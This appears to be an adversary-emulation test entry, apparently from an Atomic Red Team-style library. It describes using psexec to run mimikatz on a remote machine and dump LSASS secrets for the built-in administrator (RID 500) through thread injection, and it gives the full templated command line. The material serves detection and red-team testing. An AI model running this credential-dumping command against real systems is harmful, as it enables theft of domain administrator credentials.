Test Description: Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>. Command/Steps: \\\"#{psexec_path}\\\" /accepteula \\\\\\\\#{machine} -c #{mimikatz_path} \\\"lsadump::lsa /inject /id:500\\\" \\\"exit\\\"\n"
